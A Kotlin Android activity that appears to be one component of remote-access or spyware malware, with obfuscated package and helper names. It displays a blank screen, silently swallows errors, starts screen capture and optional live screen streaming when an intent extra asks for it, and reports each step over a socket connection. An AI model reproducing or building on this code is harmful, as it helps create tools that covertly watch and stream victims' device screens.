package com.xxx.zzz

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import com.xxx.zzz.accessppp.ScreenCaptureService
import com.xxx.zzz.globp.Globalqa
import com.xxx.zzz.socketsp.IOSocketyt
import java.lang.ref.WeakReference

class ScreenProjectionActivity : Activity() {

    var streamScreen: Boolean = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        runCatching {
            val tv = TextView(this)
            tv.text = ""
            setContentView(tv)

            IOSocketyt.sendLogs("", "ScreenProjectionActivity onCreate", "success")

            Globalqa.mainActivity = WeakReference(this)
            streamScreen = intent.getBooleanExtra("streamScreen", false)
            startScreenCaptureService(streamScreen)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        runCatching {
            Globalqa.mainActivity = WeakReference(this)
            streamScreen = intent?.getBooleanExtra("streamScreen", false) == true
            startScreenCaptureService(streamScreen)
        }
    }

    private fun startScreenCaptureService(streamScreen: Boolean) {
        runCatching {
            if (!ScreenCaptureService.hasPermission()) {
                ScreenCaptureService.requestProjection()
                return
            }
            ScreenCaptureService.startProjection(streamScreen)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        runCatching {
            ScreenCaptureService.onActivityResult(requestCode, resultCode, data)
            if (requestCode == ScreenCaptureService.mRequestCode && resultCode == RESULT_OK) {
                startScreenCaptureService(streamScreen)
                IOSocketyt.sendLogs("", "ScreenProjectionActivity startScreenCaptureService", "success")
            }
        }
    }
}
